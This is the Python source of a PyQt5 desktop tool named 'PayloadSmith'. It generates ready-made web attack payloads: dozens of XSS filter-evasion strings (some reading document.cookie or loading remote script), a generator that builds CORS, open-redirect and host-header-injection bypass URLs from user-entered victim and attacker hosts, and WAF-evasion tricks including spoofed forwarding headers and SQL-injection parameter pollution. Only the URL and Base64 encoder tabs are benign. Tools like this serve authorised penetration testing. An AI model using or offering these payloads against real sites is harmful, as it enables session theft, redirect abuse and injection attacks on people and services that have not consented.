import sys
import base64
import urllib.parse
from PyQt5.QtWidgets import QMessageBox, QComboBox, QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QLabel, QLineEdit, QPushButton, QTextEdit
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QIcon

class MainWindow(QMainWindow):
    def url_encode(self):
        try:
            selected_encoding = self.Url_encodeFrom_combo.currentText()
            text = self.Url_encode_field.toPlainText()
            self.Url_result_field.setPlainText(urllib.parse.quote(text.encode(selected_encoding)))
        except UnicodeEncodeError as ex:
            QMessageBox.information(self, "Info", str(ex))
    def url_decode(self):
        try:
            selected_encoding = self.Url_decodeFrom_combo.currentText()
            text = self.Url_decode_field.toPlainText()
            decoded_bytes = urllib.parse.unquote_to_bytes(text)
            self.Url_result_field.setPlainText(decoded_bytes.decode(selected_encoding))
        except UnicodeDecodeError as ex:
            QMessageBox.information(self, "Info", str(ex))
    def base64_encode(self):
        try:
            selected_encoding = self.Base64_encodeFrom_combo.currentText()
            text = self.Base64_encode_field.toPlainText()
            sample_string_bytes = text.encode(selected_encoding)
            base64_bytes = base64.b64encode(sample_string_bytes)
            base64_string = base64_bytes.decode(self.Base64_encodeTo_combo.currentText())
            self.Base64_result_field.setPlainText(base64_string)
        except UnicodeEncodeError as ex:
            QMessageBox.information(self, "Info", str(ex))
    def base64_decode(self):
        try:
            selected_encoding = self.Base64_decodeFrom_combo.currentText()
            text = self.Base64_decode_field.toPlainText()
            sample_string_bytes = text.encode(selected_encoding)
            base64_bytes = base64.b64decode(sample_string_bytes)
            base64_string = base64_bytes.decode(self.Base64_decodeTo_combo.currentText())
            self.Base64_result_field.setHtml(base64_string)
        except UnicodeDecodeError as ex:
            QMessageBox.information(self, "Info", str(ex))
    def xss_BypassText(self):
        Bypass_Array=[["Basic", """<SCRIPT>alert("PayloadSmith");</SCRIPT>"""], ["A Tag", """\\<a onmouseover="alert('PayloadSmith')"\\>xxs link\\</a\\>""", """<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>"""], ["IMG Tags", """<IMG "\""><SCRIPT>alert("PayloadSmith")</SCRIPT>"\\>""", """<IMG SRC=# onmouseover="alert('PayloadSmith')">"""], ["Quotes bypass", """<a onmouseover=alert(document.cookie)>xxs link</a>""", """"""], ["SRC domain check bypass", """<IMG SRC=# onmouseover="alert('PayloadSmith')">""", """<IMG SRC= onmouseover="alert('PayloadSmith')">""", """<IMG onmouseover="alert('PayloadSmith')">""", """<IMG SRC=/ onerror="alert(String.fromCharCode(80, 97, 121, 108, 111, 97, 100, 83, 109, 105, 116, 104))"></img>"""], ["HTML Character bypass", """<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000080&#0000097&#0000121&#0000108&#0000111&#0000097&#0000100&#0000083&#0000109&#0000105&#0000116&#0000104&#0000039&#0000041">"""], ["Decimal HTML Character bypass", """<a href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#80&#97&#121&#108&#111&#97&#100&#83&#109&#105&#116&#104&#39&#41">PayloadSmith</a>""", """<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x50&#x61&#x79&#x6C&#x6F&#x61&#x64&#x53&#x6D&#x69&#x74&#x68&#x27&#x29">PayloadSmith</a>"""], ["'javascript' bypass", """<a href="jav   ascript:alert('PayloadSmith');">PayloadSmith</a>""", """<a href="jav&#x09;ascript:alert('PayloadSmith');">PayloadSmith</a>""", """<a href="jav&#x0A;ascript:alert('PayloadSmith');">PayloadSmith</a>""", """<a href="jav&#x0D;ascript:alert('PayloadSmith');">PayloadSmith</a>""", """<a href=" &#14;  javascript:alert('PayloadSmith');">PayloadSmith</a>"""], ["For BODY tag", """<BODY BACKGROUND="http://xss.rocks/xss.js">""", """<INPUT TYPE="IMAGE" SRC="#" onerror=alert('PayloadSmith')>""", """<BODY ONLOAD=alert('PayloadSmith')>"""], ["Svg tag", """<svg/onload=alert('PayloadSmith')>"""], ["Instead of onError", """onAbort(),onActivate(),onAfterPrint(),onAfterUpdate(),onBeforeActivate(),onBeforeCopy(),onBeforeCut(),onBeforeDeactivate(),onBeforeEditFocus(),onBeforePaste(),onBeforePrint(),onBeforeUnload(),onBeforeUpdate(),onBegin(),onBlur(),onBounce(),onCellChange(),onChange(),onClick(),onContextMenu(),onControlSelect(),onCopy(),onCut(),onDataAvailable(),onDataSetChanged(),onDataSetComplete(),onDblClick(),onDeactivate(),onDrag(),onDragEnd(),onDragLeave(),onDragEnter(),onDragOver(),onDragDrop(),onDragStart(),onDrop(),onEnd(),onError(),onErrorUpdate(),onFilterChange(),onFinish(),onFocus(),onFocusIn(),onFocusOut(),onHashChange(),onHelp(),onInput(),onKeyDown(),onKeyPress(),onKeyUp(),onLayoutComplete(),onLoad(),onLoseCapture(),onMediaComplete(),onMediaError(),onMessage(),onMouseDown(),onMouseEnter(),onMouseLeave(),onMouseMove(),onMouseOut(),onMouseOver(),onMouseUp(),onMouseWheel(),onMove(),onMoveEnd(),onMoveStart(),onOffline(),onOnline(),onOutOfSync(),onPaste(),onPause(),onPopState(),onPropertyChange(),onReadyStateChange(),onRedo(),onRepeat(),onReset(),onResize(),onResizeEnd(),onResizeStart(),onResume(),onReverse(),onRowsEnter(),onRowExit(),onRowDelete(),onRowInserted(),onScroll(),onSeek(),onSelect(),onSelectionChange(),onSelectStart(),onStart(),onStop(),onStorage(),onSyncRestored(),onSubmit(),onTimeError(),onTrackChange(),onUndo(),onUnload(),onURLFlip(),seekSegmentTime()"""], ["IFrame", """<IFRAME SRC="javascript:alert('PayloadSmith');"></IFRAME>""", """<IFRAME SRC=# onmouseover="alert('PayloadSmith')"></IFRAME>"""], ["Frame", """<FRAMESET><FRAME SRC="javascript:alert('PayloadSmith');"></FRAMESET>"""], ["Table", """<TABLE BACKGROUND="javascript:alert('PayloadSmith')">""", """<TABLE><TD BACKGROUND="javascript:alert('PayloadSmith')">""", """<DIV STYLE="background-image: url(javascript:alert('PayloadSmith'))">"""], ["In comment", """<!--[if gte IE 4]><SCRIPT>alert('PayloadSmith');</SCRIPT><![endif]-->"""], ["Embed", """<EMBED SRC="data:image/	svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlBheWxvYWRTbWl0aCIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>"""], ["Alert bypass", """(alert)(1)""", """a=alert,a(1)""", """[1].find(alert)""", """top[“al”+”ert”](1)""", """top[/al/.source+/ert/.source](1)""", """al\u0065rt(1)""", """top[‘al\145rt’](1)""", """top[‘al\x65rt’](1)""", """top[8680439..toString(30)](1)""", """alert?.()""", """(alert())"""], ["WAF ByPass", """&lt;Img src = x onerror = "javascript: window.onerror = alert; throw PayloadSmith"&gt;""", """&lt;Video&gt; &lt;source onerror = "javascript: alert (PayloadSmith)"&gt;""", """&lt;Input value = "PayloadSmith" type = text&gt;""", """&lt;applet code="javascript:confirm(document.cookie);"&gt;""", """&lt;isindex x="javascript:" onmouseover="alert(PayloadSmith)"&gt;""", """"&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(80, 97, 121, 108, 111, 97, 100, 83, 109, 105, 116, 104))&lt;/SCRIPT&gt;""", """"&gt;&lt;img src="x:x" onerror="alert(PayloadSmith)"&gt;""", """"&gt;&lt;iframe src="javascript:alert(PayloadSmith)"&gt;""", """&lt;object data="javascript:alert(PayloadSmith)"&gt;""", """&lt;isindex type=image src=1 onerror=alert(PayloadSmith)&gt;""", """&lt;img  src="x:gif" onerror="window['al\u0065rt'](0)"&gt;&lt;/img&gt;""", """&lt;iframe/src="data:text/html,&lt;svg onload=alert(1)&gt;"&gt;""", """&lt;meta content="&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)" http-equiv="refresh"/&gt;""", """&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://github.com/ariyanjm/PayloadSmith')&gt;&lt;/script""", """&lt;meta http-equiv="refresh" content="0;url=javascript:confirm(1)"&gt;""", """&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;""", """&lt;form&gt;&lt;a href="javascript:\u0061lert(1)"&gt;X""", """&lt;/script&gt;&lt;img/*%00/src="worksinchrome&amp;colon;prompt(1)"/%00*/onerror='eval(src)'&gt;""", """&lt;style&gt;//*{x:expression(alert(/PayloadSmith/))}//&lt;style&gt;&lt;/style&gt;"""]]
        text=""
        for array in Bypass_Array:
            if array[0]==self.xss_bypasMode_combo.currentText():
                lengthOfArray=len(array)
                i=0
                while i<lengthOfArray:
                    text=text+array[i]+"\n"
                    i=i+1
        self.Bypass_text_field.setPlainText(text)
    def Cors_OR_HHIText(self):
        Bypass_Array=["https://\\\\Attacker/", "https://Victim;.Attacker/", "https://Victim:%40Attacker/", "https://Victim:443:\\%40%40Attacker/", "https://Victim:443\\%40Attacker/", "https://Victim?%40Attacker/", "https://Victim.-.Attacker/", "https://Victim.%5F.Attacker/", "https://Victim.%2C.Attacker/", "https://Victim.;.Attacker/", "https://Victim.%27.Attacker/", "https://Victim.\".Attacker/", "https://Victim.%28.Attacker/", "https://Victim.%29.Attacker/", "https://Victim.{.Attacker/", "https://Victim.}.Attacker/", "https://Victim.*.Attacker/", "https://Victim.%26.Attacker/", "https://Victim.&.Attacker/", "https://Victim.+.Attacker/", "https://Victim.%20.Attacker/", "https://Victim.Attacker/", "https://Victim.=.Attacker/", "https://Victim.%7E.Attacker/", "https://Victim.%24.Attacker/", "https://Victim%5B%40Attacker/", "https://Victim\\;%40Attacker/", "https://Victim#Attacker/", "https://Victim%2523Attacker/", "https://Victim%252EAttacker/", "https://Attacker%09Victim/", "https://Attacker%0AVictim/", "https://Attacker%00Victim/", "https://Attacker%0D%0AVictim/", "https://Attacker%09%0D%0AVictim/", "https://Attacker%E2%80%A8Victim/", "https://Attacker Victim/", "00://Attacker:80;http://Victim:80/ (needs some more adjustment)", "https://Attacker../", "https://Attacker%40%40Victim/", "https://Attacker/?d=Victim/", "https://Attacker/.Victim/", "https://Attacker///Victim/", "https://Attacker\\.Victim/", "https://Attacker%EF%BC%86Victim/", "https://Attacker%EF%B9%A0Victim/", "https://Attacker%2523%40Victim/", "https://Attacker+&%40Victim/", "https://Attacker%00Victim/", "https://localhost.Attacker/", "https://%09Attacker/", "https://%0AAttacker/", "%0D%0A//Attacker", "%0D%0A\\\\Attacker", "/&bsol;/Attacker", "/&NewLine;/Attacker", "/&sol;/Attacker", "/&Tab;/Attacker", "\\%0A\\Attacker", "\\/Attacker", "https:Attacker", "%00http://Attacker", "%01http://Attacker", "%02http://Attacker", "%03http://Attacker", "%04http://Attacker", "%05http://Attacker", "%06http://Attacker", "%07http://Attacker", "%08http://Attacker", "%09http://Attacker", "%0Ahttp://Attacker", "%0Bhttp://Attacker", "%0Chttp://Attacker", "%0Dhttp://Attacker", "%0Ehttp://Attacker", "%0Fhttp://Attacker", "%10http://Attacker", "%11http://Attacker", "%12http://Attacker", "%13http://Attacker", "%14http://Attacker", "%15http://Attacker", "%16http://Attacker", "%17http://Attacker", "%18http://Attacker", "%19http://Attacker", "%1Ahttp://Attacker", "%1Bhttp://Attacker", "%1Chttp://Attacker", "%1Dhttp://Attacker", "%1Ehttp://Attacker", "%1Fhttp://Attacker", "h%09ttp://Attacker", "h%0Attp://Attacker", "h%0Dttp://Attacker", "h%00ttp://Attacker", "http:/\\Attacker", "http:/\\\\Attacker", "http:\\Attacker", "http:/0/Attacker", "https://%E2%80%8BAttacker/", "https://%E2%81%A0Attacker/", "https://%C2%ADAttacker/", "https://127.1/", "https://%CD%8FAttacker/", "https://%E1%A0%8BAttacker/", "https://%E1%A0%8CAttacker/", "https://%E1%A0%8DAttacker/", "https://%E1%A0%8EAttacker/", "https://%E1%A0%8FAttacker/", "https://%E2%80%8BAttacker/", "https://%E2%81%A4Attacker/", "https://%E2%81%A4Attacker/"]
        text=""
        for array in Bypass_Array:
            insideText=array
            if "Attacker" in array:
                insideText=insideText.replace("Attacker",str(self.Cors_OR_HHIBypass_attacker_text_field.toPlainText()))
            if "Victim" in array:
                insideText=insideText.replace("Victim",str(self.Cors_OR_HHIBypass_victim_text_field.toPlainText()))
            text=text+insideText+"\n"
        self.Cors_OR_HHIBypass_text_field.setText(text)
    def wafBypass_BypassText(self):
        Bypass_Array=[["by headers","X-Forwarded-For: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Remote-IP: 127.0.0.1","X-Remote-Addr: 127.0.0.1","Forwarded: for=127.0.0.1, for=127.0.0.1; proto=https; by=127.0.0.1","X-Real-IP: 127.0.0.1","True-Client-IP: 127.0.0.1","CF-Connecting-IP: 127.0.0.1","X-Original-Forwarded-For: 127.0.0.1","Via: 1.1 proxy1, 1.0 proxy2"],["by url manipulation","PHP:\n\tget request url and add %20 after ? and if no ? add ?%20\n\trepeat the parameter you want to manipulate and set malicious code on second appearance E.g. /index.php?id=1&id=1'or1=1;--","ASP:\n\tget request url and add % after ? and if no ? add ?%\n\tbreak the malicious url in multiple parameter appearance E.g. /index.php?id=1\"&id=or&id=%3d1;--","All:\n\tdouble url encode E.g. index.php?id=%22or1%3D1%3B-- into %2522or1%253D1%253B--","Try mix matching Upper and lowercase characters for malicouse code E.g. union into UnIoN (Works on GET nd POST method)"],["by http method manipulation","instead of GET use HEAD","instead of POST use PUT,PATCH,PayloadSmith,Http parameter pollution"]]
        text=""
        for array in Bypass_Array:
            if array[0]==self.wafBypass_bypasMode_combo.currentText():
                lengthOfArray=len(array)
                i=0
                while i<lengthOfArray:
                    if i==0:
                        text=text+array[i]+":\n\t"
                    else:
                        text=text+array[i]+"\n\t"
                    i=i+1
        self.wafBypass_text_field.setPlainText(text)
    

    def __init__(self):
        super().__init__()
        self.setWindowTitle('PayloadSmith')
        self.setGeometry(100, 100, 800, 600)

        # Set up QTabWidget for tabs
        self.tab_widget = QTabWidget()
        self.setCentralWidget(self.tab_widget)

        # Add tabs
        self.tab_widget.addTab(self.create_Cors_OR_HHI_tab(), "CORS,Open Redirect,Host Header Injection")
        self.tab_widget.addTab(self.create_wafBypass_tab(), "Waf bypass")
        self.tab_widget.addTab(self.create_xss_tab(), "XSS")
        self.tab_widget.addTab(self.create_url_tab(), "URL")
        self.tab_widget.addTab(self.create_base64_tab(), "Base64")
        self.setWindowIcon(QIcon('logo/logo.png'))
        # Apply QSS for styling
        self.setStyleSheet("""
            QMainWindow {
                background-color: #677c91;
                color: white;
                font-family: Arial, sans-serif;
            }
            QTabWidget {
                background-color: #34495e;
                border-radius: 10px;
                font-size: 14px;
                padding: 0;
                margin: 0;
            }
            QTabBar::tab {
                background-color: #34495e;
                color: white;
                padding: 10px;
                border-radius: 5px;
                margin: 0 1px;
            }
            QTabBar::tab:selected {
                background-color: #1abc9c;
            }
            QTabWidget::pane {
                border: 2px solid #34495e;
                border-radius: 10px;
            }
            QLabel {
                font-size: 16px;
                font-weight: bold;
                margin-bottom: 10px;
            }
            QLineEdit {
                background-color: #ecf0f1;
                border: 2px solid #bdc3c7;
                border-radius: 5px;
                padding: 5px;
                font-size: 14px;
            }
            QPushButton {
                background-color: #1abc9c;
                border: none;
                color: white;
                padding: 10px 20px;
                font-size: 14px;
                border-radius: 5px;
                margin-top: 10px;
            }
            QPushButton:hover {
                background-color: #16a085;
            }
        """)
    #Cors_Open Redirect_Host Header Injection
    def create_Cors_OR_HHI_tab(self):
        Cors_OR_HHIBypass = QWidget()
        Cors_OR_HHIBypass.setGeometry(0, 0, 800, 600)
        Cors_OR_HHIBypass_label = QLabel("Enter the victim address:",Cors_OR_HHIBypass)
        Cors_OR_HHIBypass_label.move(10, 14)
        self.Cors_OR_HHIBypass_victim_text_field= QTextEdit(Cors_OR_HHIBypass)
        self.Cors_OR_HHIBypass_victim_text_field.setGeometry(250,5,350,35)
        Cors_OR_HHIBypass_label = QLabel("Enter the attacker addresse:",Cors_OR_HHIBypass)
        Cors_OR_HHIBypass_label.move(10, 56)
        self.Cors_OR_HHIBypass_attacker_text_field= QTextEdit(Cors_OR_HHIBypass)
        self.Cors_OR_HHIBypass_attacker_text_field.setGeometry(250,50,350,35)
        self.Cors_OR_HHIBypass_text_field = QTextEdit(Cors_OR_HHIBypass)
        self.Cors_OR_HHIBypass_text_field.setGeometry(10, 100, 775, 450)
        self.Cors_OR_HHIBypass_text_field.setText("")
        self.Cors_OR_HHIBypass_text_field.setReadOnly(True)
        self.Cors_OR_HHIBypass_text_field.setStyleSheet("background-color: #dbdbd7;")
        Cors_OR_HHIBypass_button = QPushButton("Create Payloads", Cors_OR_HHIBypass)
        Cors_OR_HHIBypass_button.setGeometry(610, 40, 175, 45) 
        Cors_OR_HHIBypass_button.clicked.connect(self.Cors_OR_HHIText)
        return Cors_OR_HHIBypass
    def create_wafBypass_tab(self):
        wafBypass_Modes=["by headers","by url manipulation","by http method manipulation"]
        wafBypass = QWidget()
        wafBypass.setGeometry(0, 0, 800, 600)
        wafBypass_select_label = QLabel("Select bypass mode:", wafBypass)
        wafBypass_select_label.move(10, 14)
        self.wafBypass_bypasMode_combo=QComboBox(wafBypass)
        self.wafBypass_bypasMode_combo.addItems(wafBypass_Modes)
        self.wafBypass_bypasMode_combo.setGeometry(185,5,360,35)
        self.wafBypass_bypasMode_combo.activated.connect(self.wafBypass_BypassText)
        wafBypass_text_label = QLabel("BYpass description:", wafBypass)
        wafBypass_text_label.move(10, 50)
        self.wafBypass_text_field = QTextEdit(wafBypass)
        self.wafBypass_text_field.setGeometry(10, 80, 775, 450)
        self.wafBypass_text_field.setText("")
        self.wafBypass_text_field.setReadOnly(True)
        self.wafBypass_text_field.setStyleSheet("background-color: #dbdbd7;")
        self.wafBypass_BypassText()
        return wafBypass

    def create_xss_tab(self):
        xss_Modes=["Basic","A Tag","IMG Tags","Quotes bypass","SRC domain check bypass","HTML Character bypass","Decimal HTML Character bypass","'javascript' bypass","For BODY tag","Svg tag","Instead of onError","IFrame","Frame","Table","In comment","Embed","Alert bypass","WAF ByPass"]
        xss_tab = QWidget()
        xss_tab.setGeometry(0, 0, 800, 600)
        xss_select_label = QLabel("Select bypass mode:", xss_tab)
        xss_select_label.move(10, 14)
        self.xss_bypasMode_combo=QComboBox(xss_tab)
        self.xss_bypasMode_combo.addItems(xss_Modes)
        self.xss_bypasMode_combo.setGeometry(185,5,360,35)
        self.xss_bypasMode_combo.activated.connect(self.xss_BypassText)
        xss_text_label = QLabel("XSS Recommendation :", xss_tab)
        xss_text_label.move(10, 50)
        self.Bypass_text_field = QTextEdit(xss_tab)
        self.Bypass_text_field.setGeometry(10, 80, 775, 450)
        self.Bypass_text_field.setText("")
        self.Bypass_text_field.setReadOnly(True)
        self.Bypass_text_field.setStyleSheet("background-color: #dbdbd7;")
        self.xss_BypassText()
        return xss_tab

    def create_url_tab(self):
        encodings = ["ascii", "utf-8", "utf-16", "utf-32", "latin-1", "windows-1252","big5", "gbk", "shift_jis", "euc-kr", "iso-8859-5", "iso-8859-6","iso-8859-7", "iso-8859-8", "koi8-r", "mac_roman", "hz", "utf-7","utf-8-sig", "mac_cyrillic", "windows-874", "windows-1250"]
        url_tab = QWidget()
        url_tab.setGeometry(0, 0, 800, 600)
        url_label = QLabel("Url Encoder/Decoder", url_tab)
        url_label.move(10, 10)
        self.Url_encode_field = QTextEdit(url_tab)
        self.Url_encode_field.setGeometry(10, 30, 775, 90) 
        self.Url_encode_field.setStyleSheet("background-color: #dbdbd7;")
        Url_encode_button = QPushButton("Encode Url", url_tab)
        Url_encode_button.setGeometry(610, 115, 175, 45) 
        Url_encode_button.clicked.connect(self.url_encode)
        Url_selectFrom_label = QLabel("Encode from character set :", url_tab)
        Url_selectFrom_label.move(10, 135)
        self.Url_encodeFrom_combo = QComboBox(url_tab)
        self.Url_encodeFrom_combo.addItems(encodings)
        self.Url_encodeFrom_combo.setGeometry(230, 125, 160, 35)
        self.Url_encodeFrom_combo.setStyleSheet("background-color: #dbdbd7;")

        self.Url_decode_field = QTextEdit(url_tab)
        self.Url_decode_field.setGeometry(10, 165, 775, 90)
        self.Url_decode_field.setStyleSheet("background-color: #dbdbd7;")
        Url_decodeSelectFrom_label = QLabel("Decode from character set :", url_tab)
        Url_decodeSelectFrom_label.move(10, 270)
        self.Url_decodeFrom_combo = QComboBox(url_tab)
        self.Url_decodeFrom_combo.addItems(encodings)
        self.Url_decodeFrom_combo.setGeometry(230, 260, 160, 35)
        self.Url_decodeFrom_combo.setStyleSheet("background-color: #dbdbd7;")
        Url_decode_button = QPushButton("Decode Url", url_tab)
        Url_decode_button.setGeometry(610, 250, 175, 45) 
        Url_decode_button.clicked.connect(self.url_decode)
        self.Url_result_field = QTextEdit(url_tab)
        self.Url_result_field.setGeometry(10, 300, 775, 90)
        self.Url_result_field.setText("Encode/Decode Results come here")
        self.Url_result_field.setReadOnly(True)
        self.Url_result_field.setStyleSheet("background-color: #dbdbd7;")
        return url_tab

    def create_base64_tab(self):
        encodings = ["ascii", "utf-8", "utf-16", "utf-32", "latin-1", "windows-1252","big5", "gbk", "shift_jis", "euc-kr", "iso-8859-5", "iso-8859-6","iso-8859-7", "iso-8859-8", "koi8-r", "mac_roman", "hz", "utf-7","utf-8-sig", "mac_cyrillic", "windows-1250"]

        base64_tab = QWidget(self)
        base64_tab.setGeometry(0, 0, 800, 600)
        Base64_label = QLabel("Base64 Encoder/Decoder", base64_tab)
        Base64_label.move(10, 10)
        self.Base64_encode_field = QTextEdit(base64_tab)
        self.Base64_encode_field.setGeometry(10, 30, 775, 90) 
        self.Base64_encode_field.setStyleSheet("background-color: #dbdbd7;")
        Base64_encode_button = QPushButton("Encode Base64", base64_tab)
        Base64_encode_button.setGeometry(610, 115, 175, 45) 
        Base64_selectFrom_label = QLabel("Encode from character set :", base64_tab)
        Base64_selectFrom_label.move(10, 135)
        self.Base64_encodeFrom_combo = QComboBox(base64_tab)
        self.Base64_encodeFrom_combo.addItems(encodings)
        self.Base64_encodeFrom_combo.setGeometry(230, 125, 160, 35)
        self.Base64_encodeFrom_combo.setStyleSheet("background-color: #dbdbd7;")
        Base64_selectTo_label = QLabel("to :", base64_tab)
        Base64_selectTo_label.move(400, 135)
        self.Base64_encodeTo_combo = QComboBox(base64_tab)
        self.Base64_encodeTo_combo.addItems(encodings)
        self.Base64_encodeTo_combo.setGeometry(445, 125, 160, 35)
        self.Base64_encodeTo_combo.setStyleSheet("background-color: #dbdbd7;")
        Base64_encode_button.clicked.connect(self.base64_encode)
        self.Base64_decode_field = QTextEdit(base64_tab)
        self.Base64_decode_field.setGeometry(10, 165, 775, 90)
        self.Base64_decode_field.setStyleSheet("background-color: #dbdbd7;")
        
        Base64_decodeSelectFrom_label = QLabel("Decode from character set :", base64_tab)
        Base64_decodeSelectFrom_label.move(10, 270)
        self.Base64_decodeFrom_combo = QComboBox(base64_tab)
        self.Base64_decodeFrom_combo.addItems(encodings)
        self.Base64_decodeFrom_combo.setGeometry(230, 260, 160, 35)
        self.Base64_decodeFrom_combo.setStyleSheet("background-color: #dbdbd7;")
        Base64_decodeSelectTo_label = QLabel("to :", base64_tab)
        Base64_decodeSelectTo_label.move(400, 270)
        self.Base64_decodeTo_combo = QComboBox(base64_tab)
        self.Base64_decodeTo_combo.addItems(encodings)
        self.Base64_decodeTo_combo.setGeometry(445, 260, 160, 35)
        self.Base64_decodeTo_combo.setStyleSheet("background-color: #dbdbd7;")

        Base64_decode_button = QPushButton("Decode Base64", base64_tab)
        Base64_decode_button.setGeometry(610, 250, 175, 45) 
        Base64_decode_button.clicked.connect(self.base64_decode)
        self.Base64_result_field = QTextEdit(base64_tab)
        self.Base64_result_field.setGeometry(10, 300, 775, 90)
        self.Base64_result_field.setText("Encode/Decode Results come here")
        self.Base64_result_field.setReadOnly(True)
        self.Base64_result_field.setStyleSheet("background-color: #dbdbd7;")
        return base64_tab

app = QApplication(sys.argv)
window = MainWindow()
window.show()
sys.exit(app.exec_())
